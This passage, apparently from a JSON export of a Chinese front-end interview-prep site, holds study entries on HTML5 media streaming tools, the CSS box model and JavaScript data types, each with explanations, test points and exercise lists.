绘图标准，并允许用户与之交互。这种绘图技术标准允许把 JavaScript 和 OpenGL ES 2.0 结合在一起，通过增加 OpenGL ES 2.0 的一个 JavaScript 绑定，WebGL 可以为 HTML5 Canvas 提供硬件 3D 加速渲染，这样 Web 开发人员就可以借助系统显卡来在浏览器里更流畅地展示 3D 场景和模型了，还能创建复杂的导航和数据视觉化。  \n\nWebGL 基于 canvas 画布来进行渲染。在「播放器」章节，我们了解到播放器可以通过canvas实现播放器图像渲染，通过WebGL，播放器播放流畅性能等能力得到增强。  \n\n#### 4.4 WebAssembly\n  \nWebAssembly 或者 wasm 是一个可移植、体积小、加载快并且兼容 Web 的全新格式，是由主流浏览器厂商组成的 W3C 社区团体制定的一个新的规范。  \n\n感兴趣的同学可以去[webassembly.org/](https://webassembly.org/ ) 了解学习。  \n\n基于wasm，播放器可以与FFmpeg结合，对目前浏览器器不能够识别的H.265视频进行解码。  \n\n### 五、使用的开源产品和框架\n\n  \n市面上目前流行着许多开源产品和框架，列举一些优秀的框架。  \n\n#### 5.1 flv.js\n\n  \nflv.js是Bilibili网站开源的HTML5 flv播放器，基于HTTP-FLV流媒体协议，通过纯js实现FLV转封装，使flv格式文件能在web上进行播放。  \n![](https://static.ecool.fun//article/2240afe0-d514-40fb-8422-6e84444826f6.png)  \n  \n官方GitHub：[github.com/bilibili/fl…](https://github.com/bilibili/flv.js)  \n\n#### 5.2 hls.js\n\n  \nhls.js是基于Http Live Stream协议开发，利用Media Source Extension，用于实现HLS在web上播放的一款js播放库。  \n值得一提的是由于HLS协议由苹果提出，并且在移动端设备上广泛支持，因此可以被广泛应用与直播场景。  \n![](https://static.ecool.fun//article/238bc637-243a-4ebb-86d3-59be93d66125.png)  \n  \n官方GitHub：[github.com/video-dev/h…](https://github.com/video-dev/hls.js/)  \n\n#### 5.3 video.js\n\n \nvideo.js是一款基于html5的播放器，同时支持h5和flash播放，并且拥有超过100个插件可进行使用，可满足hls、dash格式播放，支持定制主题，字幕扩展等不同层次的诉求，在世界范围拥有大量的应用场景。  \n\n官方GitHub：[github.com/videojs/vid…](https://github.com/videojs/video.js)  \n\n官方文档：[videojs.com/](https://videojs.com/)  \n\n#### 5.4 FFmpeg\n  \nFFmpeg是一套领先的多媒体框架，是一套开源且跨平台的多媒体解决方案，提供了音视频的编码、解码、转码、封装、解封装、流媒体、滤镜、播放等功能。  \n\n官网地址：[ffmpeg.org/](http://ffmpeg.org/)  \n  \n对于前端来说FFmpeg可以用来：  \n\n-   JS播放器：可以基于FFmpeg和WebAssembly实现浏览器端的JS播放器，或扩展浏览器端其他的音视频能力。\n-   Node模块 fluent-ffmpeg：node.js中非常实用的模块，该模块简化了ffmpeg复杂的命令操作，且配合文件上传以及视频流的处理等非常实用，更多详情可参考 fluent-ffmpeg\n\n#### 5.5 OBS\n\n  \nOBS（Open Broadcaster Software）是一个用于录制和进行网络直播的自由开源软件包。OBS使用C和C++语音编写，提供实时源和设备捕获、场景组成、编码、录制和广播。数据传输主要通过实时消息协议（RTMP）完成，可以发送到任何支持RTMP的目的地，包括YouTube、Twitch.tv、Instagram和Facebook等流媒体网站。  \n\n在视频编码方面，OBS可以使用X264自由软件程序库、Intel Quick Sync Video、Nvidia NVENC和AMD视频编码引擎将视频流编码为H.264/MPEG-4 AVC和H.265/HEVC格式。音频可以使用MP3或AAC编解码器进行编码。进阶用户可以选择使用Libavcodec/libavformat中的任何编解码器和容器，也可以将流输出到自定义FFmpeg URL。  \n\n#### 5.6 MLT\n  \nMLT是一个够用于多种类型app非线性视频编辑器引擎，且不局限于桌面领域(同样适用于Android、iOS等平台，功能十分强大。  \n\n官网地址：[www.mltframework.org/](https://www.mltframework.org/)  \n\ngithub：[github.com/mltframewor…](https://github.com/mltframework/mlt/)  ",
    "testPoint": "1. **多媒体元素的定义**：\n   - 理解 `<audio>` 和 `<video>` 元素的基本用途及其结构。\n\n2. **常用属性**：\n   - 掌握常用属性，如 `controls`、`autoplay`、`loop`、`muted`、`preload` 等，及其功能。\n\n3. **格式支持**：\n   - 了解常见的音频和视频格式（如 MP3、OGG、MP4、WebM）及其浏览器兼容性。\n\n4. **嵌入多媒体**：\n   - 讨论如何在网页中嵌入音频和视频，包括流媒体的使用。\n\n5. **字幕和文本轨道**：\n   - 理解如何使用 `<track>` 标签为视频添加字幕和文本轨道，提升可访问性。\n\n6. **JavaScript 控制**：\n   - 掌握如何使用 JavaScript 操作音频和视频元素，比如播放、暂停、调整音量等。\n\n7. **响应式设计**：\n   - 讨论如何使多媒体元素在不同设备和屏幕尺寸下自适应显示。\n\n8. **性能优化**：\n   - 了解音视频文件的优化技巧，如压缩、格式选择，以提高加载性能和用户体验。",
    "exerciseKeyList": "[\"45f892d7-8da0-4fd9-8550-8a7865cfcd43\",\"315725cc-0ec3-4ea0-9ef2-2b301190dbb0\",\"dad962f6-05f7-4711-a201-fad9f6215196\",\"d2fa61c7-ccd8-47db-b26e-0647fafd87a5\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 8,
    "createAt": "2024-09-27T06:02:55.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "315725cc-0ec3-4ea0-9ef2-2b301190dbb0",
        "title": "如何优化音频和视频的加载性能？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-09-27T06:24:02.000Z",
        "updateAt": "2024-09-27T06:30:43.000Z"
      },
      {
        "exerciseKey": "45f892d7-8da0-4fd9-8550-8a7865cfcd43",
        "title": "react是否支持给标签设置自定义的属性，比如给video标签设置webkit-playsinline？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-08-07T14:42:46.000Z",
        "updateAt": "2024-08-10T17:06:54.000Z"
      },
      {
        "exerciseKey": "d2fa61c7-ccd8-47db-b26e-0647fafd87a5",
        "title": "html 中的视频，怎么添加字幕？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-09-27T06:21:19.000Z",
        "updateAt": "2024-09-27T06:26:33.000Z"
      },
      {
        "exerciseKey": "dad962f6-05f7-4711-a201-fad9f6215196",
        "title": "如何使用 JavaScript 控制 <audio> 和 <video> 元素？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-09-27T06:22:31.000Z",
        "updateAt": "2024-09-27T06:27:55.000Z"
      }
    ]
  },
  "12": {
    "id": 12,
    "tagId": 11,
    "title": "盒子模型",
    "explanation": "前端盒子模型是网页布局的基础概念，对于前端开发者来说，理解盒子模型是至关重要的。\n\n### 1. 盒子模型的组成部分\n\n- **内容（Content）**: \n  - 盒子中实际显示的文本或图像部分。内容区的大小由 `width` 和 `height` 属性确定。\n\n- **内边距（Padding）**: \n  - 内容与边框之间的空间。它用于增加内容与边框之间的距离，可以通过 `padding`、`padding-top`、`padding-right`、`padding-bottom` 和 `padding-left` 属性进行设置。\n\n- **边框（Border）**: \n  - 环绕在内边距和内容周围的边界。可以设置边框的宽度、样式和颜色。相关属性包括 `border`、`border-width`、`border-style` 和 `border-color`。\n\n- **外边距（Margin）**: \n  - 盒子外部的空间。用于控制元素与元素之间的间距。可以通过 `margin`、`margin-top`、`margin-right`、`margin-bottom` 和 `margin-left` 属性进行设置。\n\n### 2. 标准盒子模型与替代盒子模型\n\n- **标准盒子模型（content-box）**:\n  - 默认的盒子模型。`width` 和 `height` 只包含内容区，不包括内边距和边框。因此，元素的实际占用空间是 `width + padding + border`。\n\n- **替代盒子模型（border-box）**:\n  - 通过设置 `box-sizing: border-box`，使得 `width` 和 `height` 包括内边距和边框，这样内容区的大小会自动调整以适应总高度和宽度。这样做通常可以避免许多布局问题。\n\n#### 示例\n```css\n.box {\n    box-sizing: content-box; /* 默认值 */\n    width: 200px;\n    padding: 20px;\n    border: 5px solid black;\n}\n```\n在标准模型下：\n- 总宽度 = 200px + 20px (左内边距) + 20px (右内边距) + 5px (左边框) + 5px (右边框) = 250px\n\n```css\n.box {\n    box-sizing: border-box; /* 替代模型 */\n    width: 200px;\n    padding: 20px;\n    border: 5px solid black;\n}\n```\n在替代模型下：\n- 总宽度 = 200px (包括内边距和边框)\n\n### 3. 影响盒子模型的CSS属性\n\n- `width` 和 `height`: 决定内容区域的大小。\n- `padding`: 返回内容区与边框之间的空间。\n- `border`: 定义边框以及它的宽度、样式和颜色。\n- `margin`: 定义元素外部的空白空间。\n\n### 4. 盒子模型的计算公式\n\n在标准盒子模型下：\n```\n总宽度 = width + padding-left + padding-right + border-left + border-right\n总高度 = height + padding-top + padding-bottom + border-top + border-bottom\n```\n在替代盒子模型下：\n```\n总宽度 = width （包括内边距和边框）\n总高度 = height （包括内边距和边框）\n```\n\n### 5. 常见问题与解决方案\n\n- **元素重叠**: 使用内边距、边框和外边距来调整元素之间的空间可帮助解决元素重叠的问题。\n- **意外的空白**: 使用 `box-sizing: border-box` 可以减少因内边距和边框大小变化而引起的布局问题。\n- **外边距合并**: 相邻的块级元素的外边距会合并，这可能会导致意外的布局结果。知道这一点可以帮助更好地理解和调整布局。\n\n### 6. 布局方式与盒子模型的关系\n\n- **浮动布局**: 浮动元素的外边距和边框也会影响周围元素的布局。\n- **Flexbox**: Flexbox 布局可以更灵活地控制元素的尺寸和对齐方式，而盒子模型可以更细致地调整每个元素的空间。\n- **Grid 布局**: Grid 布局可以在多个维度上控制元素的布局，盒子模型则提供了元素之间的精确控制。\n",
    "testPoint": "### 1. **盒模型基础**\n   - 请简述 CSS 盒模型的概念。一个元素在页面中会占据多少空间？\n   - 盒模型的组成部分有哪些？它们分别是什么作用？\n     - `content`（内容区域）\n     - `padding`（内边距）\n     - `border`（边框）\n     - `margin`（外边距）\n\n### 2. **标准盒模型与怪异盒模型**\n   - 请解释标准盒模型和怪异盒模型的区别。它们的主要区别是什么？\n   - 在标准盒模型中，元素的 `width` 和 `height` 只包含内容区域的尺寸，内边距、边框和外边距不算在内。怪异盒模型如何影响元素的尺寸计算？\n   - 如何使用 `box-sizing` 属性来切换标准盒模型和怪异盒模型？\n     - `box-sizing: content-box` 与 `box-sizing: border-box` 的区别是什么？\n\n### 3. **`box-sizing` 属性**\n   - `box-sizing` 属性的作用是什么？如何使用它来控制元素的尺寸计算方式？\n   - `box-sizing: border-box` 如何影响元素的尺寸计算？在设计布局时如何使用该属性来简化计算？\n   - 为什么推荐在开发中使用 `box-sizing: border-box` 作为默认值？\n\n### 4. **内边距 (`padding`)**\n   - `padding` 属性的作用是什么？它如何影响元素的布局？\n   - 如何设置元素的四个方向的内边距？如何设置不同方向的内边距？\n   - `padding` 是否会影响元素的总宽度和高度？如果使用了怪异盒模型，它如何影响布局？\n\n### 5. **边框 (`border`)**\n   - `border` 的作用是什么？如何设置边框的宽度、样式和颜色？\n   - 边框的宽度是否会影响元素的总尺寸？如果使用怪异盒模型时，边框会如何影响布局？\n   - 如何使用 `border-radius` 来创建圆角边框？它与盒模型中的边框有什么关系？\n\n### 6. **外边距 (`margin`)**\n   - `margin` 的作用是什么？它如何影响元素之间的间距？\n   - 相邻元素的 `margin` 会发生什么情况？请解释“外边距折叠”现象，并举个例子。\n   - 如何使用负值的 `margin`？负外边距有什么实际应用场景？\n\n### 7. **自动宽度与高度 (`width` 和 `height`)**\n   - 如何使用 `width` 和 `height` 控制元素的尺寸？它们如何与盒模型中的其他属性（如 `padding`, `border`）协同工作？\n   - 如果使用了 `box-sizing: border-box`，如何设置元素的宽度和高度，以确保总尺寸符合预期？\n\n### 8. **块级元素与内联元素的盒模型**\n   - 块级元素和内联元素在盒模型中有什么不同？它们的布局方式有什么区别？\n   - `display: inline-block` 对元素的盒模型有什么影响？\n\n### 9. **计算元素总宽度与高度**\n   - 如何计算一个元素的总宽度和总高度？\n     - 在标准盒模型下，总宽度 = `width` + `padding-left` + `padding-right` + `border-left` + `border-right` + `margin-left` + `margin-right`。\n     - 在怪异盒模型下，总宽度 = `width`（包含 `padding` 和 `border`）。\n\n### 10. **响应式布局中的盒模型**\n   - 在响应式设计中，如何利用盒模型的知识来确保布局在不同屏幕尺寸下的适应性？\n   - 如何结合百分比宽度和盒模型的理解来创建自适应的元素？\n\n### 11. **盒模型在 Flex 和 Grid 布局中的影响**\n   - 在 `flexbox` 布局中，盒模型如何影响子元素的排列？\n   - `flexbox` 中的 `flex-grow`、`flex-shrink`、`flex-basis` 如何与元素的盒模型尺寸协同工作？\n   - 在 CSS Grid 布局中，盒模型如何影响网格单元的尺寸？\n\n### 12. **常见问题与调试技巧**\n   - 在开发中，如何解决由于盒模型计算错误导致的布局问题？\n   - 你是否遇到过盒模型导致的布局崩溃或错乱问题？是如何调试并解决的？\n\n### 13. **盒模型与元素的可视化**\n   - 如何通过 CSS 查看元素的盒模型？你如何调试盒模型的尺寸和边距问题？\n   - 如何使用开发者工具查看和修改元素的盒模型？\n\n### 14. **实际案例**\n   - 请描述一个项目中你如何通过合理运用盒模型来解决布局问题。\n   - 如何使用盒模型的知识来创建一个居中的布局，或者是创建一个固定大小的卡片元素？",
    "exerciseKeyList": "[\"dc607f56-c467-4cc2-8a0a-c79d498bee49\"]",
    "vipLimit": 0,
    "level": 1,
    "pointOrder": 0,
    "createAt": "2024-09-30T02:13:03.000Z",
    "updateAt": "2024-11-10T05:40:33.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "dc607f56-c467-4cc2-8a0a-c79d498bee49",
        "title": "说说你对盒子模型的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T09:01:57.000Z",
        "updateAt": "2024-07-22T10:02:50.000Z"
      }
    ]
  },
  "13": {
    "id": 13,
    "tagId": 10,
    "title": "数据类型",
    "explanation": "## 前言\n\n> 请讲下 `JavaScript` 中的数据类型？\n\n前端面试中，估计大家都被这么问过。\n\n答：`Javascript` 中的数据类型包括原始类型和引用类型。其中原始类型包括 `Null`、`Undefined`、`Boolean`、`String`、`Symbol`、`BigInt`。引用类型指的是 `Object`。\n\n没错，我也是这么回答的，只是这通常是第一个问题，由这个问题可以引出很多很多的问题，比如\n\n- `Null` 和 `Undefined` 有什么区别？前端的判空有哪些需要注意的？\n- `typeof null` 为什么是 `object`?\n- 为什么 `ES6` 要提出 `Symbol`？\n- `BigInt` 解决了什么问题？\n- 为什么 `0.1 + 0.2 !== 0.3?` 你如何解决这个问题？\n- 如何判断一个值是数组？\n- ...\n\n## 弱类型语言\n\n因为 `JavaScript` 是弱类型语言或者说是动态语言。这意味着你不需要提前声明变量的类型，在程序运行的过程中，类型会被自动确定，也就是说你可以使用同一个变量保存不同类型的值\n\n```javascript\nvar foo = 42;  // foo is a Number now\nfoo = \"bar\";  // foo is a String now\nfoo = true;   // foo is a Boolean now\n```\n\n这一特性给我们带来便利的同时，也给我们带来了很多的类型错误。试想一下，假如 `JS` 说是强类型语言，那么各个类型之间没法转换，也就有了一层隔阂或者说一层保护，会不会更加好维护呢？——这或许就是 `TypeScript` 诞生的原因。\n\n对 `JavaScript` 的数据类型掌握，是一个前端最基本的知识点\n\n## null 还是 undefined\n\n### 定义\n\n`undefined` 表示未定义的变量。`null` 值表示一个空对象指针。\n\n> 追本溯源: 一开始的时候，`JavaScript` 设计者 `Brendan Eich` 其实只是定义了 `null`，`null` 像在 `Java` 里一样，被当成一个对象。但是因为 `JavaScript` 中有两种数据类型：原始数据类型和引用数据类型。`Brendan Eich` 觉得表示\"无\"的值最好不是对象。\n\n所以 `Javascript` 的设计是 **null是一个表示\"无\"的对象，转为数值时为0；undefined是一个表示\"无\"的原始值，转为数值时为NaN。**\n\n```javascript\nNumber(null)\n// 0\n\n5 + null\n// 5\n\nNumber(undefined)\n// NaN\n\n5 + undefined\n// NaN\n```\n\n### Null 和 Undefined 的区别和应用\n\n**null表示\"没有对象\"，即该处不应该有值。**，典型的用法如下\n\n1. 作为函数的参数，表示该函数的参数不是对象。\n2. 作为对象原型链的终点。\n\n```javascript\nObject.getPrototypeOf(Object.prototype)\n// null\n```\n\n**undefined表示\"缺少值\"，就是此处应该有一个值，但是还没有定义**。典型用法是：\n\n1. 变量被声明了，但没有赋值时，就等于 `undefined`。\n2. 调用函数时，应该提供的参数没有提供，该参数等于`undefined`。\n3. 对象没有赋值的属性，该属性的值为 `undefined`。\n4. 函数没有返回值时，默认返回 `undefined`。\n\n```javascript\nvar i;\ni // undefined\n\nfunction f(x){console.log(x)}\nf() // undefined\n\nvar  o = new Object();\no.p // undefined\n\nvar x = f();\nx // undefined\n```\n\n### 判空应该注意什么？\n\n`javaScript` 五种空值和假值，分别为 undefined，null，false，\"\"，0\n\n这有时候很容易导致一些问题，比如\n\n```javascript\nlet a = 0;\nconsole.log(a || '/'); // 本意是只要 a 为 null 或者 Undefined 的时候，输出 '/'，但实际上只要是我们以上的五种之一就输出 '/'\n```\n\n当然我们可以写成\n\n```javascript\nlet a = 0;\nif (a === null || a === undefined) {\n  console.log('/');\n} else {\n  console.log(a);\n}\n```\n\n始终不是很优雅，所以 ES规范 提出了空值合并操作符（??）\n\n> 空值合并操作符（??）是一个逻辑操作符，当左侧的操作数为 null 或者 undefined 时，返回其右侧操作数，否则返回左侧操作数。\n\n上面的例子可以写成：\n\n```javascript\nlet a = 0;\nconsole.log(a??'/'); // 0\n```\n\n## typeof null——JS 犯的错\n\n```javascript\ntypeof null // \"object\"\n```\n\n`JavaScript` 中的值是由一个表示类型的标签和实际数据值表示的。第一版的 `JavaScript` 是用 32 位比特来存储值的，且是通过值的低 1 位或 3 位来识别类型的，对象的类型标签是 000。如下\n\n- 1：整型（int）\n- 000：引用类型（object）\n- 010：双精度浮点型（double）\n- 100：字符串（string）\n- 110：布尔型（boolean）\n\n但有两个特殊值：\n\n- undefined，用整数−2^30（负2的30次方，不在整型的范围内）\n- null，机器码空指针（C/C++ 宏定义），低三位也是000\n\n由于 `null` 代表的是空指针（低三位也是 `000` `），因此，null` 的类型标签是 `000`，`typeof null` 也因此返回 \"object\"。\n\n这个算是 `JavaScript` 设计的一个错误，但是也没法修改，毕竟修改的话，会影响目前现有的代码\n\n## Number——0.1+0.2 !== 0.3\n\n### 现象\n\n在 `JavaScript` 会存在类似如下的现象\n\n```javascript\n0.1 + 0.2\n0.30000000000000004\n```\n\n### 原因\n\n我们在对浮点数进行运算的过程中，需要将十进制转换成二进制。十进制小数转为二进制的规则如下：\n\n> 对小数点以后的数乘以2，取结果的整数部分（不是1就是0），然后再用小数部分再乘以2，再取结果的整数部分……以此类推，直到小数部分为0或者位数已经够了就OK了。然后把取的整数部分按先后次序排列\n\n根据上面的规则，最后 0.1 的表示如下：\n\n> 0.000110011001100110011（0011无限循环）……\n\n所以说，精度丢失并不是语言的问题，而是浮点数存储本身固有的缺陷。\n\n`JavaScript` 是以 `64` 位双精度浮点数存储所有 `Number` 类型值，按照 `IEEE754` 规范，0.1 的二进制数只保留 52 位有效数字，即\n\n> 1.100110011001100110011001100110011001100110011001101 * 2^(-4)\n\n同理，0.2的二进制数为\n\n> 1.100110011001100110011001100110011001100110011001101 * 2^(-3)\n\n这样在进制之间的转换中精度已经损失。运算的时候如下\n\n```javascript\n0.00011001100110011001100110011001100110011001100110011010\n+0.00110011001100110011001100110011001100110011001100110100\n=0.01001100110011001100110011001100110011001100110011001110\n```\n\n所以导致了最后的计算结果中 0.1 + 0.2 !== 0.3\n\n### 如何解决\n\n- 将数字转成整数\n\n```javascript\nfunction add(num1, num2) {\n  const num1Digits = (num1.toString().split('.')[1] || '').length;\n  const num2Digits = (num2.toString().split('.')[1] || '').length;\n  const baseNum = Math.pow(10, Math.max(num1Digits, num2Digits));\n  return (num1 * baseNum + num2 * baseNum) / baseNum;\n}\n```\n\n- 类库\n\n`NPM` 上有许多支持 `JavaScript` 和 `Node.js` 的数学库，比如 `math.js`，`decimal.js`,`D.js` 等等\n\n- ES6\n\n`ES6` 在 `Number` 对象上新增了一个极小的常量——`Number.EPSILON`\n\n```javascript\nNumber.EPSILON\n// 2.220446049250313e-16\nNumber.EPSILON.toFixed(20)\n// \"0.00000000000000022204\"\n```\n\n引入一个这么小的量，目的在于为浮点数计算设置一个误差范围，如果误差能够小于 `Number.EPSILON`，我们就可以认为结果是可靠的。\n\n```javascript\nfunction withinErrorMargin (left, right) {\n  return Math.abs(left - right) < Number.EPSILON\n}\nwithinErrorMargin(0.1+0.2, 0.3)\n```\n\n### 未来的解决方案——[TC39 Decimal proposal](https://link.segmentfault.com/?enc=3bFjkwlQjsVHUQTVZ2R96w%3D%3D.BI2C%2FsW0zAzKRid7UPhHSMdHmcMgTmtZgsKi7T%2FCoQuFkkFiln92%2BtpJ%2F9LDBUljTRE1sSyaH6F64GxUoTd7kF75iQyU2NZD8Xi%2BNjIGDFs%3D)\n\n目前处于 `Stage 1` 的提案。后文提到的 `BigInt` 扩展的是 `JS` 的正数边界，超过 2^53 安全整数问题。`Decimal` 则是解决JS的小数问题-2^53。这个议案在JS中引入新的原生类型：`decimal`(后缀m)，声明这个数字是十进制运算。\n\n```javascript\nlet zero_point_three = 0.1m + 0.2m;\nassert(zero_point_three === 0.3m);\n// 提案中的例子\nfunction calculateBill(items, tax) {\n  let total = 0m;\n  for (let {price, count} of items) {\n    total += price * BigDecimal(count);\n  }\n  return BigDecimal.round(total * (1m + tax), {maximumFractionDigits: 2, round: \"up\"});\n}\n\nlet items = [{price: 1.25m, count: 5}, {price: 5m, count: 1}];\nlet tax = .0735m;\nconsole.log(calculateBill(items, tax));\n```\n\n### 拓展——浮点数在内存中的存储\n\n所以最终浮点数在内存中的存储是什么样的呢？`EEE754` 对于浮点数表示方式给出了一种定义\n\n> (-1)^S _M_ 2^E\n> \n> 各符号的意思如下：S，是符号位，决定正负，0时为正数，1时为负数。M，是指有效位数，大于1小于2。E，是指数位。\n\n![](https://static.ecool.fun//article/0e01cc09-7c0d-44cf-8e05-4de8c1891855.jpeg)\n\nJavascript 是 64 位的双精度浮点数，最高的 1 位是符号位S，接着的 11 位是指数E，剩下的 52 位为有效数字M。\n\n## BigInt——突破最大的限制\n\n`JavaScript` 的 `Number` 类型为 [双精度IEEE 754 64位浮点](https://en.wikipedia.org/wiki/Floating-point_arithmetic)类型。  \n在 JavaScript 中最大的值为 `2^53`。\n\n![](https://static.ecool.fun//article/b1878e77-fe77-47af-8fe5-41b303b45087.jpeg)\n\n`[BigInt](https://link.segmentfault.com/?enc=AHcJ3RFIuOe9hpnBrVz%2Bsg%3D%3D.4YPpYPK76xX%2BYyrmbyiMuwPt%2BT%2BOIxdUDaWznETB%2BJ5GdyvU6p2DnCb8nHwn%2F9r6BzyxpEdhFGaiyTM4VZQgM5HxblzptkE%2FANLs%2BDm3%2FvzKWUqIgpY44pN9aRxar%2F8v)` 任意精度数字类型，已经进入stage3规范。`BigInt` 可以表示任意大的整数。要创建一个 `BigInt` ，我们只需要在任意整型的字面量上加上一个 n 后缀即可。例如，把123 写成 123n。这个全局的 BigInt(number) 可以用来将一个 Number 转换为一个 BigInt，言外之意就是说，BigInt(123) === 123n。现在让我来利用这两点来解决前面我们提到问题：\n\n![](https://static.ecool.fun//article/212db091-d3a7-4477-b430-f699ab5f80f6.jpeg)\n\n## Symbol——我是独一无二最靓的仔\n\n### 定义\n\nES6 引入了一种新的原始数据类型 `Symbol`，表示独一无二的值\n\n```javascript\nlet s = Symbol();\n\ntypeof s\n// \"symbol\"\n```\n\n### 应用场景\n\n- 定义一组常量，保证这组常量都是不相等的。消除魔法字符串\n- 对象中保证不同的属性名\n\n```javascript\nlet mySymbol = Symbol();\n\n// 第一种写法\nlet a = {};\na[mySymbol] = 'Hello!';\n\n// 第二种写法\nlet a = {\n[mySymbol]: 'Hello!'\n};\n\n// 第三种写法\nlet a = {};\nObject.defineProperty(a, mySymbol, { value: 'Hello!' });\n\n// 以上写法都得到同样结果\na[mySymbol] // \"Hello!\"\n```\n\n- `Vue` 中的 `provide` 和 `inject`。`provide` 和 `inject` 可以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在起上下游关系成立的时间里始终生效。但这个侵入性也是非常强的，使用 `Symbols` 作为 `key` 可以避免对减少对组件代码干扰，不会有相同命名等问题\n\n## 数组——对象中一个特殊的存在\n\n> 请说下判断 Array 的方法？\n\n### 为什么会问这个问题？\n\n因为数组是一个特殊的存在，是我们平时接触得最多的数据结构之一，它是一个特殊的对象，它的索引就是“普通对象”的 `key` 值。但它又拥有一些“普通对象”没有的方法，比如 `map` 等\n\n`typeof` 是 `javascript` 原生提供的判断数据类型的运算符，它会返回一个表示参数的数据类型的字符串。但我们不能通过 `typeof` 判断是否为数组。因为 `typeof` 数组和普通对象以及 `null`，都是返回 \"object\"\n\n```javascript\nconst a = null;\nconst b = {};\nconst c= [];\nconsole.log(typeof(a)); //Object\nconsole.log(typeof(b)); //Object\nconsole.log(typeof(c)); //Object\n```\n\n### 判断数组的方法\n\n- `Object.prototype.toString.call()`。\n\n每一个继承 `Object` 的对象都有 `toString` 方法，如果 `toString` 方法没有重写的话，会返回 `[Object type]`，其中 `type` 为对象的类型\n\n```javascript\nconst a = ['Hello','Howard'];\nconst b = {0:'Hello',1:'Howard'};\nconst c = 'Hello Howard';\nObject.prototype.toString.call(a);//\"[object Array]\"\nObject.prototype.toString.call(b);//\"[object Object]\"\nObject.prototype.toString.call(c);//\"[object String]\"\n```\n\n- Array.isArray()\n\n```javascript\nconst a = [];\nconst b = {};\nArray.isArray(a);//true\nArray.isArray(b);//false\n```\n\n`Array.isArray()` 是 `ES5` 新增的方法，当不存在 `Array.isArray()` ，可以用 `Object.prototype.toString.call()` 实现\n\n```javascript\nif (!Array.isArray) {\n  Array.isArray = function(arg) {\n    return Object.prototype.toString.call(arg) === '[object Array]';\n  };\n}\n```\n\n- `instanceof`。`instanceof` 运算符可以用来判断某个构造函数的 `prototype` 属性所指向的對象是否存在于另外一个要检测对象的原型链上。因为数组的构造函数是 `Array`，所以可以通过以下判断。**注意：因为数组也是对象，所以 **`**a instanceof Object**`** 也为 **`**true**`\n\n```javascript\nconst a = [];\nconst b = {};\nconsole.log(a instanceof Array);//true\nconsole.log(a instanceof Object);//true,在数组的原型链上也能找到Object构造函数\nconsole.log(b instanceof Array);//false\n```\n\n- `constructor`。通过构造函数实例化的实例，拥有一个 `constructor` 属性。\n\n```javascript\nfunction B() {};\nlet b = new B();\nconsole.log(b.constructor === B) // true\n```\n\n而数组是由一个叫 `Array` 的函数实例化的。所以可以\n\n```javascript\nlet c = [];\nconsole.log(c.constructor === Array) // true\n```\n\n> **注意：constructor 是会被改变的。所以不推荐这样判断**\n\n```javascript\nlet c = [];\nc.constructor = Object;\nconsole.log(c.constructor === Array); // false\n```",
    "testPoint": "### 1. **基本数据类型**\n   - **Primitive Types**：JavaScript 有七种基本数据类型：\n     - **Number**：表示数字，包括整数和浮点数。\n     - **String**：表示字符串，文本数据。\n     - **Boolean**：表示布尔值，只有 `true` 和 `false`。\n     - **Undefined**：表示未定义的值，通常是变量声明但未赋值时的状态。\n     - **Null**：表示空值，表示“无”或“缺失”。\n     - **Symbol**（ES6 引入）：表示唯一的标识符，用于对象属性的键。\n     - **BigInt**：用于表示任意精度的整数。它允许开发者处理超过     `Number.MAX_SAFE_INTEGER` 的整数。\n\n### 2. **引用数据类型**\n   - **Object**：引用类型的集合，包括数组、函数、日期、正则表达式等。\n   - **Array**：特殊的对象，表示有序的数据集合，考察点可能包括数组的方法（如 `push`、`pop`、`map`、`filter`）。\n   - **Function**：函数也是对象，可以作为一等公民，考察点可能包括函数的属性和方法（如 `call`、`apply`、`bind`）。\n\n### 3. **数据类型检查**\n   - **typeof 操作符**：用于检测数据类型，常见考点包括如何使用 `typeof` 来判断基本类型和引用类型。\n   ```javascript\n   typeof 'hello'; // \"string\"\n   typeof 42;      // \"number\"\n   typeof {};      // \"object\"\n   typeof null;    // \"object\" (这是一个历史遗留问题)\n   ```\n   - **instanceof 操作符**：用于检查对象的类型，考察如何使用 `instanceof` 判断对象是否为特定构造函数的实例。\n   ```javascript\n   [] instanceof Array; // true\n   ```\n\n### 4. **类型转换**\n   - **隐式转换**：考察 JavaScript 如何在不同上下文中自动进行类型转换，例如在运算时（如字符串和数字相加）。\n   - **显式转换**：如何使用 `String()`、`Number()`、`Boolean()` 函数进行显式类型转换，以及使用 `parseInt()` 和 `parseFloat()` 转换字符串为数字。\n\n### 5. **NaN 和 Infinity**\n   - **NaN**：表示不是一个数字，考察点包括如何判断一个值是否为 NaN（通常使用 `Number.isNaN()`）。\n   - **Infinity**：表示正无穷大或负无穷大，考察如何处理计算中的无穷大值。\n\n### 6. **值传递与引用传递**\n   - **基本数据类型的值传递**：当将基本类型赋值给变量时，传递的是值的副本。\n   - **引用数据类型的引用传递**：当将引用类型赋值给变量时，传递的是对原始对象的引用，考察点包括如何修改对象属性对原对象的影响。\n\n### 7. **空值的区别**\n   - **null vs. undefined**：考察如何区分这两种类型的不同含义和使用场景，以及如何在代码中处理它们。\n\n### 8. **对象的可变性**\n   - **对象的属性动态添加和删除**：考察如何动态地添加、修改和删除对象属性，及其对对象的影响。\n   ```javascript\n   const obj = {};\n   obj.name = 'Alice'; // 动态添加属性\n   delete obj.name;    // 删除属性\n   ```\n\n### 9. **特殊对象**\n   - **Array 和 Object 的不同**：考察数组和对象在性能、用途、方法上的差异。\n   - **日期和正则表达式**：如何创建和使用 `Date` 和 `RegExp` 对象，常见方法和应用场景。\n\n### 10. **数据结构的应用**\n   - **Map 和 Set**：ES6 引入的新的数据结构，考察如何使用它们，以及它们与对象和数组的区别。\n   ```javascript\n   const myMap = new Map();\n   myMap.set('key', 'value');\n   ```\n\n### 11. **数据类型的边界情况**\n   - **比较操作中的奇特行为**：如使用 `==` 和 `===` 进行比较时的不同，以及如何避免常见的比较陷阱。\n   ```javascript\n   null == undefined; // true\n   null === undefined; // false\n   